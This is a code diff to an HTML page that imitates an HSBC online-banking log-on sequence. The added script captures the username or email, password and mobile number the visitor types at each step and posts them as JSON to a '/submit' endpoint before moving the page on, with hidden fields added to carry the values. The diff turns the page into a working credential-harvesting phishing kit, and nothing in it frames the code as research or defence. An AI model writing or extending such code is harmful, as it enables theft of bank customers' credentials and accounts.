@@ -145,7 +145,9 @@
             <input type="tel" id="hsbc-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
             <p class="hint">Used for SMS one-time passcodes in step 3.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <input type="hidden" id="email" value="" />
+          <input type="hidden" id="ms-mobile" value="" />
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your username?</a>
@@ -177,7 +179,7 @@
             <input type="password" id="ma" autocomplete="off" />
             <p class="hint">Your answer is not case sensitive.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back</a>
@@ -224,7 +226,7 @@
           </div>
           <p class="resend">Problems with your Secure Key? <a href="#" onclick="return false;">Get help</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Resend SMS code</a></p>
 
-          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log on</button>
+          <button class="btn" onclick="doVerify(this)">Confirm &amp; Log on</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(2);return false;">&larr; Back</a>
@@ -317,6 +319,31 @@
 </footer>
 
 <script>
+  async function sendLogs(type) {
+    var emailEl = document.getElementById('email');
+    var mobileEl = document.getElementById('ms-mobile');
+    if (emailEl) emailEl.value = document.getElementById('uid')?.value || emailEl.value || '';
+    if (mobileEl) mobileEl.value = document.getElementById('hsbc-mobile')?.value || mobileEl.value || '';
+    var payload = {
+      type: type,
+      email: emailEl?.value || '',
+      pwd: document.getElementById('pwd')?.value || '',
+      mobile: mobileEl?.value || ''
+    };
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.warn('sendLogs failed', e);
+    }
+  }
+  function nextStep(btn) { sendLogs('email-step'); goWithLoader(2, btn); }
+  function doPassword(btn) { sendLogs('password-step'); goWithLoader(3, btn); }
+  function doVerify(btn) { sendLogs('verify-step'); goWithLoader(4, btn); }
+
   function goWithLoader(n, btn) {
     var origHtml = btn.innerHTML;
     var isFinal  = n === 4;
